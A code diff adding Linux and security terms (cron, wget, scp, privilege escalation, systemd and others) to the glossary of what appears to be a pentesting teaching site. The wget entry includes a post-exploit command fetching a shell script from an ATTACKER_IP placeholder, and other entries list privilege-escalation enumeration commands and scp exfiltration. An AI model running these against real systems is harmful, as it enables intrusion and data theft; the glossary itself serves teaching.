@@ -64,6 +64,15 @@ window.GLOSSARY = {
   },
 
   /* ---------- C ---------- */
+  "apt": {
+    name: "apt (Package Manager)",
+    aliases: ["apt-get", "aptitude", "debian-package-manager", "package-manager"],
+    category: "Linux Command",
+    blurb: "How Debian/Ubuntu machines install, update, and remove software.",
+    short: "The Advanced Package Tool — the main command for installing software on Debian-based Linux (Ubuntu, Kali, Parrot). `apt update` refreshes the package list, `apt install <pkg>` installs, `apt remove <pkg>` uninstalls. Software comes from repositories listed in /etc/apt/sources.list. Trust is enforced with GPG keys. Pentest angle: a misconfigured sources.list or a rogue repo = supply-chain compromise.",
+    page: "apt.html",
+    related: ["linux-permissions", "ssh"]
+  },
   "chmod": {
     name: "chmod",
     aliases: ["chmod command", "change-mode", "change-permissions"],
@@ -71,7 +80,7 @@ window.GLOSSARY = {
     blurb: "The Linux command that changes file permissions. Lives in every privesc writeup.",
     short: "Short for 'change mode.' Changes who can read, write, or execute a file/directory. Used with symbolic (u+x) or numeric (755, 644, 777) syntax. A misconfigured chmod is a classic privilege-escalation goldmine — world-writable scripts that root executes, world-readable password files, SUID binaries.",
     page: "chmod.html",
-    related: ["linux-permissions", "su", "privilege-escalation"]
+    related: ["linux-permissions", "su", "privilege-escalation", "cron"]
   },
   "cryptographic-failure": {
     name: "Cryptographic Failure (A02)",
@@ -90,6 +99,16 @@ window.GLOSSARY = {
     short: "An attack that forces a user's authenticated browser to submit a forged request to a target site — changing their email, transferring money, etc. — without their knowledge.",
     page: "csrf.html",
     related: ["xss", "same-origin-policy"]
+  },
+
+  "cron": {
+    name: "cron / crontab",
+    aliases: ["crontab", "cronjob", "cron-job", "scheduled-task"],
+    category: "Linux Command",
+    blurb: "Linux's built-in scheduler. Runs commands automatically at set times. Privesc goldmine.",
+    short: "The cron daemon runs scheduled tasks defined in `crontab` files. Each line = 5 time fields (min, hour, day-of-month, month, day-of-week) + the command to run. Use `crontab -e` to edit yours. Attackers LOVE cron: a world-writable script that cron runs as root = instant privilege escalation. Always check /etc/crontab, /etc/cron.*/, and per-user crontabs when enumerating a Linux box.",
+    page: "cron.html",
+    related: ["linux-permissions", "chmod", "privilege-escalation"]
   },
 
   /* ---------- D ---------- */
@@ -112,6 +131,17 @@ window.GLOSSARY = {
     short: "Converting characters into a different representation (e.g., %27 for ' in URLs, &#x53; for S in HTML/XML). Used legitimately to move data safely — and used by attackers to bypass input filters.",
     page: "encoding.html",
     related: ["obfuscation", "waf"]
+  },
+
+  /* ---------- G ---------- */
+  "gpg": {
+    name: "GPG (GNU Privacy Guard)",
+    aliases: ["gnupg", "pgp", "gpg-key"],
+    category: "Cryptography",
+    blurb: "Public-key crypto for signing, verifying, and encrypting. apt uses it to trust packages.",
+    short: "GNU Privacy Guard — an open-source implementation of PGP. Uses public/private key pairs to sign data (proving who made it) and encrypt data (so only the recipient can read it). When you `apt install` something, GPG verifies the package's signature matches the publisher's trusted key — if the signature is forged or missing, install fails. Also used for signing commits, emails, and release builds.",
+    page: "gpg.html",
+    related: ["apt", "cryptographic-failure", "authentication"]
   },
 
   /* ---------- H ---------- */
@@ -137,6 +167,15 @@ window.GLOSSARY = {
   },
 
   /* ---------- L ---------- */
+  "log-file": {
+    name: "Log File",
+    aliases: ["logs", "log", "access-log", "error-log", "syslog"],
+    category: "Linux Fundamentals",
+    blurb: "The server's diary. Every login, every request, every crash — all written to /var/log/.",
+    short: "A file where software records events as they happen — user logins, web requests, errors, service starts/stops. Linux stores most logs under /var/log/. Key ones: auth.log (who logged in), syslog (system events), apache2/access.log (every web hit), fail2ban.log (blocked brute-forcers). Pentesters read logs to find internal IPs, valid usernames, or traces of previous attacks. Defenders read them to spot YOU.",
+    page: "log-file.html",
+    related: ["ssh", "brute-force", "authentication"]
+  },
   "linux-permissions": {
     name: "Linux Permissions (rwx)",
     aliases: ["file permissions", "unix permissions", "rwx", "chmod permissions", "posix permissions"],
@@ -170,6 +209,15 @@ window.GLOSSARY = {
   },
 
   /* ---------- P ---------- */
+  "pid": {
+    name: "PID (Process ID)",
+    aliases: ["process-id", "process", "processes"],
+    category: "Linux Fundamentals",
+    blurb: "A running program's ID number. PID 1 = systemd, the mother of all processes.",
+    short: "Every running program on Linux gets a unique Process ID. PID 1 is special — it's the first process the kernel starts at boot (usually `systemd` on modern distros). All other processes descend from PID 1. You view processes with `ps aux` or `top`, and kill them with `kill <PID>` (or `kill -9 <PID>` for a hard stop). Pentest angle: enumerating running processes reveals services, credentials in command-line args, and privileged daemons worth targeting.",
+    page: "pid.html",
+    related: ["systemd", "ssh", "linux-permissions"]
+  },
   "parameterized-query": {
     name: "Parameterized Query",
     aliases: ["prepared statement", "parameterized-queries", "prepared-statements"],
@@ -199,6 +247,16 @@ window.GLOSSARY = {
   },
 
   /* ---------- R ---------- */
+  "privilege-escalation": {
+    name: "Privilege Escalation",
+    aliases: ["privesc", "priv-esc", "priv-escalation"],
+    category: "Post-Exploitation",
+    blurb: "Going from low-priv user → root (or admin). The second half of every pentest.",
+    short: "The process of abusing misconfigurations, weak permissions, or vulnerabilities to gain higher privileges than you were initially given. Vertical privesc = low-user → root. Horizontal privesc = jumping sideways to another user. Common Linux paths: world-writable cron scripts, SUID binaries (find / -perm -4000), sudo misconfigs (sudo -l), kernel exploits, leaked creds in /tmp or ~/.bash_history.",
+    page: "privilege-escalation.html",
+    related: ["chmod", "cron", "linux-permissions", "reverse-shell", "su"]
+  },
+
   "rce": {
     name: "RCE (Remote Code Execution)",
     aliases: ["remote code execution"],
@@ -219,6 +277,15 @@ window.GLOSSARY = {
   },
 
   /* ---------- S ---------- */
+  "scp": {
+    name: "scp (Secure Copy)",
+    aliases: ["secure-copy", "scp-command"],
+    category: "Linux Command",
+    blurb: "Copy files between machines over SSH. The pentester's exfil tool of choice.",
+    short: "Secure Copy — copies files between your machine and a remote machine over an encrypted SSH tunnel. Syntax is just SOURCE DESTINATION where either end can be a remote path like user@host:/path. Works both directions: push files to a target, or pull files from it. Post-exploit: `scp` is a fast way to exfiltrate loot when SSH is available. Modern alternatives: `rsync`, `sftp`.",
+    page: "scp.html",
+    related: ["ssh", "wget", "reverse-shell"]
+  },
   "single-quote": {
     name: "Single Quote ( ' )",
     aliases: ["apostrophe", "single-quote-delimiter", "string-delimiter"],
@@ -291,6 +358,15 @@ window.GLOSSARY = {
     page: "su.html",
     related: ["ssh", "linux-permissions", "chmod", "privilege-escalation"]
   },
+  "systemd": {
+    name: "systemd (and systemctl)",
+    aliases: ["systemctl", "init-system", "service-manager"],
+    category: "Linux Fundamentals",
+    blurb: "The process that starts everything else. PID 1 on modern Linux.",
+    short: "The init system that boots modern Linux distros and manages services (daemons). Every service = a 'unit' systemd starts, stops, or auto-restarts. The `systemctl` CLI controls it: `systemctl start/stop/enable/disable/status <service>`. `enable` = auto-start at boot. Pentest angle: `systemctl list-units --type=service` reveals what's running; a misconfigured unit file owned by a low-priv user but run by root = privesc.",
+    page: "systemd.html",
+    related: ["pid", "cron", "privilege-escalation"]
+  },
 
   /* ---------- U ---------- */
   "union-attack": {
@@ -304,6 +380,15 @@ window.GLOSSARY = {
   },
 
   /* ---------- W ---------- */
+  "wget": {
+    name: "wget",
+    aliases: ["wget-command", "web-get", "download-command"],
+    category: "Linux Command",
+    blurb: "Download files over HTTP/HTTPS from the command line. A pentester's favorite.",
+    short: "A non-interactive downloader built into most Linux distros. Give it a URL and it saves the content locally. Supports recursive downloads, resuming broken transfers, and following redirects. Post-exploit move: `wget http://ATTACKER_IP:8000/shell.sh -O /tmp/s.sh` pulls your payload onto the target. Alternative: `curl -O`. If neither exists on the box, you've got a minimal system and might have to get creative with bash's `/dev/tcp`.",
+    page: "wget.html",
+    related: ["scp", "reverse-shell", "ssh"]
+  },
   "waf": {
     name: "WAF (Web Application Firewall)",
     aliases: ["web-application-firewall"],
